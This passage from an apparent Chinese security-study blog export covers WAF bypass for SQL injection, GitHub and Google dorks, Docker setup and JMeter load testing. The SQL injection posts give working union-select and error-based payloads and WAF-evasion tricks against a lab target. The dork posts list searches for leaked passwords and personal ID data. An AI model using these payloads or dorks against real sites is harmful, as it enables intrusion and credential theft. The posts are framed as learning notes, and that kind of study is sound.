1,2,3,4,5,6 http://www.xxx.com/view_detail.asp?id=91+union+select+1,2,3,4,5,6 http://www.xxx.com/view_detail.asp?id=91+union+select+1,2,3,4,5,6 from admin_user -- 下面就可以进行其它的操作了,更多参考：http://testingpai.com/article/1618882195644 黑盒绕过绕过的四大分类 架构层面绕过waf 资源限制角度绕过waf 协议层面绕过waf 规则层面的绕过waf 架构层面绕过waf寻找源网站绕过 waf 检测 主要针对的是云waf,找到源网站的真实地址,进行绕过,有点像CDN 1.发邮件：注册账户或者遇到一些异常是 通过邮件查看是否为真实服务器的IP 2.超级ping：对于某些偏远 用户访问量小的可能提供的服务是从真实服务器IP进行处理 3.海外服务：通过代理海外的IP去访问服务，如果企业没有海外CDN、云waf 可能就会提供真实的服务器IP进行处理 4.ico文件：获取云waf title 中的ico小图标 计算 Hash 值 通过fofa 查找 Hash值，如果有相同的那么另外一台或几台可能就是真实服务器的IP或者也有可能是另外一些云waf 通过同网段绕过Waf防护 在一个网段中,可能经过的数据不会经过云Waf,从而实现绕过。 这里就需要能难到同网段的机器或者通过同网段的进行转发 资源限制角度绕过waf 一般waf的执行需要优先考虑业务优先的原则,所以对于构造较大、超大数据包可能不会进行检测,从而实现绕过waf。 Http Get方法提交的数据大小长度并没有限制，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。如：IE对URL长度的限制是2083字节(2K+35)。Google (chrome) URL最大长度限制为8182个字符。 理论上讲，POST是没有大小限制的。HTTP协议规范也没有进行大小限制，起限制作用的是服务器的处理程序的处理能力。如：在Tomcat下取消POST大小的限制（Tomcat默认2M） post 传参-- 请求地址 http://192.168.151.5/sqli/Less-1/ -- body 体 id=1' union select 1,2,3 # 尝试查看库名#请求的 body 体 id=-1' union select 1,2,database() # 超大数据包-FIXMEid=-1' /*超大数据包内容*/ union select 1,2,database() # 协议层面绕过waf协议未覆盖绕过waf 比如由于业务需要,只对get型进行检测,post数据选择忽略 宝塔就是这个典型 那么对于那些既可以发起get又能通过post的就可以开始挑战了 参数污染 index?id=18&amp;id=2 waf可能只对id=1进行检测 这个策略主要也是针对宝塔 -- 执行此语句提示触发宝塔waf http://192.168.1.118/sqli/Less-1/?id=1 union select 1,2,database() --+ -- 参数污染 通过加上多个重复的参数 去干扰 waf http://192.168.1.118/sqli/Less-1/?id=?id=?id=?id=-1' union select 1,2,database() --+ 规则层面的绕过wafsql注释符绕过union /**/select 空白符绕过 对关键字监测的地方尝试用空白符隔开 函数分割符号 将一个函数进行分割 concat() %25其实就是百分号 %25A0 就是空白符concat%2520concat/**/(concat%250c(concat%25a0( 浮点数词法解释 waf 对于id=1可以进行检测,但是对于d=1E0、id=1.0、id=\\N可能就无法检测 利用error- based进行sq注入 报错注入现在 的时效性并不好了，基本上都能被waf拦截了 extractvalue(1, concat(0X5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version))f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() mysql特殊语法select {x schema_name} from {x information_schema.schemata}; select{x 1} select {xdsdsd database()}; 代码规则的waf 大小写绕过:如果对关键字 and or union等进行了过滤,可以考虑使用大小写混合的方法 Or aNd UniOn 但是很多时候有函数会部分大小写进行过滤,这个时候我们可以考虑使用双写的方法 关键字重复:OORr→or 关键字替换:如果还是无法绕过,可以考虑替换的方法 and→&amp;&amp; or→|| like可以替换= &lt;&gt;等价于!= 练习-TODO-- 拦截 http://192.168.151.5/sqli/Less-1/?id=1' union select 1,2,3 --+ -- 正常 http://192.168.151.5/sqli/Less-1/?id=1' union 1,2,3 --+ -- 正常 http://192.168.151.5/sqli/Less-1/?id=1' select 1,2,3 --+ -- 正常 http://192.168.151.5/sqli/Less-1/?id=1' union /*select*/ 1,2,3 --+ -- 拦截 http://192.168.151.5/sqli/Less-1/?id=1' union /*!select*/ 1,2,3 --+ -- 正常 http://192.168.151.5/sqli/Less-1/?id=1' union /*!12345*/ 1,2,3 --+ -- 拦截 http://192.168.151.5/sqli/Less-1/?id=1' union /*!12345 database()*/ 1,2,3 --+ -- 拦截 http://192.168.151.5/sqli/Less-1/?id=1' union /*!12345 select*/ 1,2,3 --+","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://www.adalucky.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"绕过waf","slug":"绕过waf","permalink":"https://www.adalucky.com/tags/%E7%BB%95%E8%BF%87waf/"}],"author":"Ada"},{"title":"GitHub信息收集","slug":"Security/GitHub信息泄露","date":"2021-08-04T11:03:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/github-xin-xi-xie-lu/","link":"","permalink":"https://www.adalucky.com/security/github-xin-xi-xie-lu/","excerpt":"GitHub是全球最大的代码托管平台，报告显示，2019年10月到2020年9月，Github上开发者数量超过五千六百万，里面存在的信息泄露也是数不胜数","text":"GitHub是全球最大的代码托管平台，报告显示，2019年10月到2020年9月，Github上开发者数量超过五千六百万，里面存在的信息泄露也是数不胜数 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 介绍 简介 对已知厂商、用户名的情况下进行网站代码的收集效果较好 github 是一个基于gt的代码托管平台,付费用户可以建私人仓库 我们一般的免费用户只能使用公共仓库,也就是代码要公开。 官网链接: htps/github.com 搜索语句介绍 in: name test #仓库标题搜索含有关键字testin: descripton test #仓库描述搜索含有关键字in readme test # Readme文件搜素含有关键字stars:&gt;3000 test # stars数量大于3000的搜索关键字stars:1000..3000 test # stars数量大于1000小于3000的搜索关键字forks:&gt;1000 test #forks数量大于1000的搜索关键字forks:1000..3000 test # forks数量大于1000小于3000的搜索关键字size:&gt;=5000 test #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字 pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字 user:test #用户名搜索license:apache-2.0 test #明确仓库的 LICENSE搜索关键字language: python @qq.com #在python语言的代码中搜索关键字user: test in: name test #组合搜索,用户名为test的且标题含有test的 基础语法练习仓库标题搜索含有关键字 in: name test #仓库标题搜索含有关键字test 仓库描述搜索含有关键字 in: descripton test #仓库描述搜索含有关键字 Readme文件搜素含有关键字 in readme test # Readme文件搜素含有关键字 stars数量大于3000的搜索关键字 stars:&gt;3000 test # stars数量大于3000的搜索关键字 stars数量大于1000小于3000的搜索关键字 stars:1000..3000 test # stars数量大于1000小于3000的搜索关键字 forks数量大于1000的搜索关键字 forks:&gt;1000 test #forks数量大于1000的搜索关键字 forks数量大于1000小于3000的搜索关键字 forks:1000..3000 test # forks数量大于1000小于3000的搜索关键字 指定仓库大于5000k(5M)的搜索关键字 size:&gt;=5000 test #指定仓库大于5000k(5M)的搜索关键字 发布时间大于2019-02-12的搜索关键字 pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字 创建时间大于2019-02-12的搜索关键字 created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字 发布时间大于2019-02-12的搜索关键字 pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字 user:test #用户名搜索 user:test #用户名搜索 明确仓库的 LICENSE搜索关键字 license:apache-2.0 test #明确仓库的 LICENSE搜索关键字 在python语言的代码中搜索关键字 language: python @qq.com #在python语言的代码中搜索关键字 ![python语言的代码中搜索关键字](/Users/ada/Library/Application Support/typora-user-images/image-20210803225148701.png) 组合搜索,用户名为test的且标题含有test的 user:test in:name test #组合搜索,用户名为test的且标题含有test的 GitHub信息泄露邮件信息泄露 smtp@126.com &amp; password # smtp 邮件配置泄露搜索 可以选择最近更新的 钓鱼时候利用第三方邮箱 是不是能找到数据库信息内 site:Github.com smtp site:Github.com smtp @qg.com site:Github.com smtp @126.com site:Github.com smtp @163.com site:Github.com smtp @asina.com.cn site:Github.com smtp password site:Github.com String password smtp ![邮件信息泄露](/Users/ada/Library/Application Support/typora-user-images/image-20210803231014559.png) 用户信息泄露 root &amp; password .sql 密码 site:Github.com sa passwordsite:Github.com root passwordsite:Github.com User ID=’sa’;Password ![数据库信息泄露](/Users/ada/Library/Application Support/typora-user-images/image-20210804125056649.png) svn信息泄露 svn &amp; password site:Github.com svnsite:Github.com svn usernamesite:Github.com svn passwordsite:Github.com svn username password 数据库备份文件 Github之数据库备份文件site:Github.com inurl:sql 其它信息 site:Github.com sshsite:Github.com passwordsite:Github.com ftp ftppasswordsite:Github.com 密码site:Github.com 身份证号site:Github.com 手机号site:Github.com 银行卡密码site:Github.com 内部 远程登录实例 远程登录实例 #搜索该关键字 类型选择Text 溯源#克隆项目 git clone git地址 #进入项目 cd 项目名 #获取提交人信息 git log","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"GitHub语法","slug":"GitHub语法","permalink":"https://www.adalucky.com/tags/GitHub%E8%AF%AD%E6%B3%95/"},{"name":"信息收集","slug":"信息收集","permalink":"https://www.adalucky.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"author":"Ada"},{"title":"Docker","slug":"Other/Docker","date":"2021-08-04T01:54:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/other/docker/","link":"","permalink":"https://www.adalucky.com/other/docker/","excerpt":"Docker 是 PaaS 提供商 dotCloud 开源的一个基于 LXC 的高级容器引擎，源代码托管在 Github 上,基于go语言并遵从Apache2.0协议开源 Docker自2013年以来非常火热，无论是从 github 上的代码活跃度，还是Redhat在RHEL6.5中集成对Docker的支持, 就连 Google 的 Compute Engine 也支持 docker 在其之上运行。","text":"Docker 是 PaaS 提供商 dotCloud 开源的一个基于 LXC 的高级容器引擎，源代码托管在 Github 上,基于go语言并遵从Apache2.0协议开源 Docker自2013年以来非常火热，无论是从 github 上的代码活跃度，还是Redhat在RHEL6.5中集成对Docker的支持, 就连 Google 的 Compute Engine 也支持 docker 在其之上运行。 CentOS镜像配置 配置了镜像站点以后服务器下载东西的速度会快点 参考:https://developer.aliyun.com/mirror/?spm=a2c6h.13651104.0.d1002.154412b2ZxG98v 备份#备份镜像文件（好像会根据CentOS的版本不同 CentOS-Base.repo文件名也不相同） $ mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载新镜像配置文件#下载新的的CentOS-Base.repo 到 /etc/yum.repos.d/ https://mirrors.aliyun.com/repo/Centos-7.repo这个链接会根据版本不同也会发生变化，这里是7版本 $ wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo 编辑#这一步反正是官网的操作，应该是编辑配置文件 $ sed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo Docker的安装 参考官方文档：https://docs.docker.com/engine/install/centos/ 卸载旧版本sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine 设置存储库#安装yum-utils软件包（提供yum-config-manager 实用程序） sudo yum install -y yum-utils #设置稳定的存储库 sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo 安装Docker引擎#方式一：安装最新版本的Docker Engine和容器 sudo yum install docker-ce docker-ce-cli containerd.io #方式二：安装指定的版本 yum list docker-ce --showduplicates | sort -r #1.查看版本 #docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; 版本号为第二列从第一个冒号（:）到第一个连字符（-） sudo yum install docker-ce-20.10.6 docker-ce-cli-20.10.6 containerd.io #2.安装指定版本 启动docker#启动docker sudo systemctl start docker #版本查看 docker -v #设置开机启动 systemctl enable docker Docker安装程序Portainer安装 通过web页面进行管理镜像和容器，参考：https://www.jianshu.com/p/575de760bfd4 #搜索相关Portainer镜像，以免错过更好的第三方镜像 docker search portainer #下载选定的Portainer镜像，这里我们选择下载量最多的官方镜像，如果未指定版本则默认为最新版本，latest版本 docker pull portainer/portainer #运行镜像：本机模式 docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock --restart=always --name prtainer portainer/portainer #运行镜像：远程模式 docker run -d -p 9000:9000 --restart=always --name prtainer portainer/portainer 访问Portainer容器：http://IP:9000 首次登录需要设置admin的密码 #开放9000端口 firewall-cmd --zone=public --add-port=9000/tcp --permanent 注：–restart=always，无论退出状态是如何，都重启容器，可达到开机自启 删除容器 可通过Portainer的可视化界面进行删除 删除Image 删除多余的镜像文件，需要先删除容器后再删除镜像 mysql允许远程访问#拉取 mysql 镜像 docker pull mysql:latest # 启动容器分配端口 及密码 注意服务器端口的开放情况 docker run -itd --name centos7_mysql57 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql #查看正在运行的容器 docker ps #进入指定容器 docker exec -it centos7_mysql57 /bin/bash #登录mysql控制台（回车后输入密码） mysql -u root -p #设置远程登录权限校验版本（8 及以上版本失效百度试下） grant all privileges on *.* to 'root'@'%' identified by 'abcd0987' with grant option; Nginx安装#search nginx找到官方版本 docker search nginx #pull nginx docker pull nginx #run -d 后台启动 --restart=always 重启时自动启动 docker run -d --name docker_nginx -p 8080:80 --restart=always nginx # 通过浏览器访问ip+端口 看是否有提示 Welcome to nginx! http://49.234.62.82:8080/ 配置点击显/隐代码块(Nginx配置) #nginx的配置文件在容器的/etc/nginx/nginx.conf文件，将这个文件放在当前宿主机所在目录下并命名为nginx.conf $PWD指当前执行命令时候所在的目录 docker cp docker_nginx:etc/nginx/nginx.conf $PWD/nginx.conf #因为Nginx里面没有安装vi和vim不好编辑（也可以在容器内装一个直接修改不cp） # 修改配置文件指定路径 在http{}中添加server{} server { listen 80 default_server; listen [::]:80 default_server; server_name localhost; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location /perf { root /ada/nginx/html; index perf.html perf.htm; } location /security { root /ada/nginx/html; index security.html security.htm; } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } #将修改好的 $PWD/nginx.conf 文件拷贝到 docker_nginx:etc/nginx/nginx.conf docker cp $PWD/nginx.conf docker_nginx:etc/nginx/nginx.conf html文件#exec进入 Nginx 容器 docker exec -it docker_nginx /bin/bash #在容器内创建配置文件中写入的根目录 mkdir /ada/nginx/html -p #退出容器 exit #将宿主机下/ada/nginx/下的 perf.html、security.html两个文件复制到容器内的/ada/nginx/html/目录下 docker cp /ada/nginx/perf.html docker_nginx:/ada/nginx/html/perf.html docker cp /ada/nginx/security.html docker_nginx:/ada/nginx/html/security.html #因为刚才修改了配置文件，所以需要重启Nginx docker restart docker_nginx Redis安装# 拉取 images docker pull redis:latest # 查看拉取是否成功 docker images 配置下载配置文件 访问官网下载压缩包后把配置文件 copy 出来（注意一下版本）Redis 官网 服务器配置 创建一个 redis/data 文件用于存放配置文件和数据 上传刚才下载的配置文件到 redis 目录下 # 创建 data 目录 mkdir -p redis/data # 写入配置文件（可以自己把 redis.conf 传上去或者文本 copy 进去） vim redis/data/redis.conf bind 127.0.0.1 #注释掉这部分，使redis可以外部访问 daemonize no#用守护线程的方式启动 requirepass 你的密码#给redis设置密码 appendonly yes#redis持久化 默认是no tcp-keepalive 300 #防止出现远程主机强迫关闭了一个现有的连接的错误 默认是300 启动 注意端口要开放一下 # 启动 Redis docker run -p 6379:6379 --name redis -v /root/redis/redis.conf:/etc/redis/redis.conf -v /root/redis/data:/data -d redis redis-server /etc/redis/redis.conf --appendonly yes","categories":[{"name":"Other","slug":"Other","permalink":"https://www.adalucky.com/categories/Other/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.adalucky.com/tags/Docker/"},{"name":"Centos","slug":"Centos","permalink":"https://www.adalucky.com/tags/Centos/"}],"author":"Ada"},{"title":"性能测试场景设计","slug":"Performance/性能测试场景设计","date":"2021-08-02T14:46:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/performance/xing-neng-ce-shi-chang-jing-she-ji/","link":"","permalink":"https://www.adalucky.com/performance/xing-neng-ce-shi-chang-jing-she-ji/","excerpt":"性能测试过程中,目标不同,需要选择的性能测试场景也有很大的差异,今天以 JMeter 为例,简单说说性能测试、负载测试、压力测试三大场景到底都是什么怎么个含义","text":"性能测试过程中,目标不同,需要选择的性能测试场景也有很大的差异,今天以 JMeter 为例,简单说说性能测试、负载测试、压力测试三大场景到底都是什么怎么个含义 介绍 市面上有很多的性能测试工具 各有千秋，后面我们将采用 JMeter 进行 工具名称 特点 jmeter 基于 ==java== 开发的开源,多线程工具，学习成本低,能做接口测试、接口自动化、性能测试、需要做jmeter第三方依赖扩展 loadrunner 商业 ==loadrunner== 要付费购买并发用户数,费用高，脚本是c语言,性能比较好,性能指标值比较准确,性能测试的标杆 wrk 快速响应性能测试工具,但是,不能做很复杂事情 安装服务后用过命令行执行 ab 快速响应性能测试工具,但是,不能做很复杂事情 安装服务后用过命令行执行 ngrinder 做性能侧开平台、性能工程的平台groovy（java衍生）、 jython（java+python衍生）运行时依赖jre jdk1.8+ 环境 ngrinder 版本选3.x以上 python+locust python语言进行性能测试，基于协程运行 环境准备 cpu主频3Ghz 大概能启动3000个并发用户数 在实际运行中 http协议协议簇 大概一台电脑在1500-2000并发用户数 过多会报错 环境准备插件管理器安装 将下载的 ==jmeter-plugins-manager-1.6.jar== 文件复制jmeter安装目录下的 ==/lib/ext== 文件夹下 重启一下jmeter（如果移动前已启动） jpjc插件安装 下载jdbc插件 安装可能会失败再次点击 ==apply changes and restat jmeter== 因为插件托管到国外导致的网络原因 安装成功后会自动重启jmeter 如果一直失败 尝试手动导入 验证插件是否安装成功 正常情况下只要上面步骤安装没有报错 自动重启了那么就表示已经安装成功了，接下来也可以进行一些查看来验证 验证的方式 可以去==lib\\lib目录下查看== 是否有下载出来文件 或者在对应的 ==菜单中是否有对应选项== 三大场景设计前提提示 每次执行执行性能测试前确保 CPU 1分钟内的负载值尽量为不高于1的小数，越小越好 性能测试遵循准则 ==缓起步 慢结束== 拿生活中举例 在汽车驾驶中要缓慢的起步不要太猛，刹车的时候可以踩快一点刹车 负载测试概念 逐步增加并发用户数，探测服务器最大的拐点区间，再次对区间进行性能测试找出相对准确的最大并发用户数 阶梯式场景 基础配置说明 Tish group will start【 100 】 threads：这个线程组最终要启动100个线程 First，wait for 【 0 】 seconds：启动第一个线程需要等待0秒 Then start 【 0 】threads：从第0个线程开始 Next，add 【 10 】 threads every 【30】seconds using ramp-up【5】seconds：在5秒内，增加10个线程，然后持续运行30秒 Then hold load for【60】seconds：线程都启动完后持续运行60秒 Finally，stop【5】 threads every【1】seconds：当持续60秒运行完毕后每一秒停止5个线程 脚本转换 将普通的功能测试脚本转换为负载的脚本，转换前先确保脚本能执行成功 jp@gc - Transactions per Second：==tps响应时间== jp@gc - Response Times Over Time：==随着时间变化的响应时间== jp@gc - Active Threads Over Time：==随着时间变化的并发用户数== 确认最大并发区间 点击执行等待结果，当满足条件时停止线程（如：响应时间≤1.5S，或给出具体的TPS值当出现大于该指标值时停止线程）进行分析 如果此次执行结果表现性能良好，那么把Tish group will start【 100 】 threads：这个线程组最终要启动100个线程个线程改为200 Then start 【 0 】threads：从第0个线程开始，改为100（上面的最后的并发数），再次进行测试分析 通过下图结果结合企业标准（tps下降 响应时间≥1.5S 请求报错），我们确定了性能拐点区间为20-40个并发用户数 确认最大并发数 Then start 【 0 】threads：从第0个线程开始，这里改为区间最小值20 Tish group will start【 100 】 threads：这个线程组最终要启动100个线程，这里改为40 Next，add 【 10 】 threads every 【30】seconds using ramp-up【5】seconds：在5秒内，增加10个线程，然后持续运行30秒 改为【1】【60】【1】在1秒内，增加1个线程，然后持续运行60秒 通过下图结果结合企业标准（tps 响应时间≤1.5S），我们确定了最大并发用户数为23-25（相对保守）23-28（相对激进） 压力测试概念 在一定的压力下，持续较长的时间，测试服务的稳定性，可靠性，一般是以小时为单位或者1-2天（因为现在互联网环境，速度很快）,在服务器出现不稳定的情况下再去做压力测试 一定的压力：最大并发用户数*20%+相对较长时间，最大并发用户数X80%+相对短时间 波浪场景 性能测试可靠性测试 在给定一定的业务压力下，持续一段时间看系统是否稳定 最大并发x20% 容量测试 不同数据量级,数万条,百万条数据的操作读写不一样,因为测试环境数据一般不会很多,除非自己创造,所以在测试环境的速度和正式环境会有差异 在性能测试时,如果数据库的数据量级是不一致的,性能指标值,也可能存在差异 生成的数据库数据量级百万级,测试环境几千几百条读写速度肯定会有差异，因此在做性能测试的时候数据库的量级要保持一致（可通过主从数据进行同步，或者批量造数据）","categories":[{"name":"Performance","slug":"Performance","permalink":"https://www.adalucky.com/categories/Performance/"}],"tags":[{"name":"jmeter","slug":"jmeter","permalink":"https://www.adalucky.com/tags/jmeter/"},{"name":"负载","slug":"负载","permalink":"https://www.adalucky.com/tags/%E8%B4%9F%E8%BD%BD/"},{"name":"压力","slug":"压力","permalink":"https://www.adalucky.com/tags/%E5%8E%8B%E5%8A%9B/"},{"name":"性能","slug":"性能","permalink":"https://www.adalucky.com/tags/%E6%80%A7%E8%83%BD/"}],"author":"Ada"},{"title":"Google语法练习","slug":"Security/Google Hacking","date":"2021-08-01T07:19:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/google-hacking/","link":"","permalink":"https://www.adalucky.com/security/google-hacking/","excerpt":"谷歌是全球目前最大的搜索引擎，百度是全球最大的中文搜索引擎，如何更快的检索你的信息？","text":"谷歌是全球目前最大的搜索引擎，百度是全球最大的中文搜索引擎，如何更快的检索你的信息？ 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 介绍 对某一个站点收集信息，大类搜索 Google Hacking的含义原指利用 Google Google搜索引擎搜索信息来进行入侵的技术和行为 Google Hacking是利用谷歌搜索的强大,用在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素岀一些遗留后门,不想被发现的后台入口,中量级的可搜索出一些用户信息泄露,源代码泄露,未授权访问等等,重量级的则可能是mdb文件下载,CMs未被锁定install也面,网站配置密码,php远程文件包含漏洞等重要信息 谷歌语法可以在我们安全测试中起到一个非常关键的作用。尤其在信息收集、漏洞挖掘等 用法介绍 基本的搜索符 逻辑与: and 逻辑或: or 逻辑非: - 完整匹配: “关键词” 通配符: *? 基础用法intext 把网页中的正文内容中的某个字符作为搜索的条件 intitle intitle把网页标题中的某个字符作为搜索的条件 intitle:后台登录 将只返回标题中包含后台登录的网页 alltitle 用法和intitle类似,只不过可以指定多个词 例如: allite:后台登录 管理员 将返回标题中包含后台登录和管理员的网页 filetype 指定一个格式类型的文件作为搜索对象 名单filetype:pdf 敏感文件类型:.pwl口令文件、.tmp临时文件、.cfg配置文件、.ini系统文件、hlp帮助文件、.dat数据文件、.log日志文件 inurl 搜索包含指定字符的URL inurl:Login 将返回 url 中含有 Login 的网页 site 在指定的站点搜索相关內容 site:baidu.com allinurl 用法和inurl类似,只不过可以指定多个词,例如: allinurl:Login admin 将返回url中含有Login和 admin的网页 allinurl:admin 后台 返回在∪RL里边包含了关键词 admin和后台的网页 进阶用法双引号 把关键字打上引号后,把 ==引号部分作为整体== 来搜索 inurl:\"后台地址\" or语句 同时搜索两个或更多的关键字 inurl: \"后台\" or \"管理\" 找文件 通过 index of /admin index of /root 等等一类 找注入点 通过url 匹配 找到一些 url 中有包含的 编辑器漏洞 inurl:ewebeditor 找后台数据库登录页面 后台 site: 域名 inurl: login | admin | manage I member | admin_login | login_admin | system | login | user I main CI intext:管理|后台|登陆|用户名密码|验证码|系统|帐号 intitle;管理后台登陆丨用户名|密码|验证码|系统|帐号 注入点 site:域名 inurl: aspx | jsp | php | asp 上传 site:域名 inurL: file | load | editor | Files 练习用户信息 查找语句 \"学号\" | \"身份证\" | \"姓名\" filetype:xls 探针 UPUPW PHP探针安全版 付款跳转 intext:”付款后按提示点击确定跳转到提取页面” 转到父目录 Intext:”转到父目录”","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://www.adalucky.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Google 语法","slug":"Google-语法","permalink":"https://www.adalucky.com/tags/Google-%E8%AF%AD%E6%B3%95/"}],"author":"Ada"},{"title":"Xray的基础使用","slug":"Security/Xray","date":"2021-07-31T23:03:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/xray/","link":"","permalink":"https://www.adalucky.com/security/xray/","excerpt":"xray是一种功能强大的扫描工具。xray 社区版是长亭科技推出的免费白帽子工具平台，目前社区有 xray 漏洞扫描器和 Radium 爬虫工具，由多名经验丰富的安全开发者和数万名社区贡献者共同打造而成。","text":"xray是一种功能强大的扫描工具。xray 社区版是长亭科技推出的免费白帽子工具平台，目前社区有 xray 漏洞扫描器和 Radium 爬虫工具，由多名经验丰富的安全开发者和数万名社区贡献者共同打造而成。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 